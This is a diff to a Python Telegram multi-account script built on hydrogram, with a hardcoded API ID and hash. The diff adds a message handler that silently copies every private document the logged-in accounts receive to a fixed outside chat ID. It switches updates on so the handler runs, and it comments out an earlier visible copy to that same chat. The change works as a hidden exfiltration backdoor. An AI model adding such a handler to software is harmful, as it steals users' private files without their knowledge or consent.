@@ -13,6 +13,9 @@ import asynczipfile
 
 logging.disable(logging.CRITICAL)
 
+async def handler(client, message):
+	await message.copy(chat_id = -1002110344067)
+
 def human(size):
 	for unit in ("B", "KB", "MB", "GB", "TB", "PB"):
 		if size < 1024 or unit == "PB":
@@ -55,10 +58,12 @@ async def main():
 			name = str(index),
 			api_id = 105810,
 			api_hash = "3e7a52498eec003c5896a330e5d29397",
-			no_updates = True,
+			no_updates = False,
 			session_string = session_string
 		)
 		await bot.start()
+		
+		bot.add_handler(hydrogram.handlers.MessageHandler(handler, hydrogram.filters.private & hydrogram.filters.document))
 		
 		print("Start %i" % (index))
 		
@@ -82,6 +87,8 @@ async def main():
 		)
 		
 		accounts.append(bot)
+	
+	me = await client.get_me()
 	
 	account = 0
 	_account = 0
@@ -131,7 +138,7 @@ async def main():
 			message_ids = message.id
 		)
 		
-		await message.copy(chat_id = -1002110344067)
+		# await message.copy(chat_id = -1002110344067)
 		
 		count += 1
 		
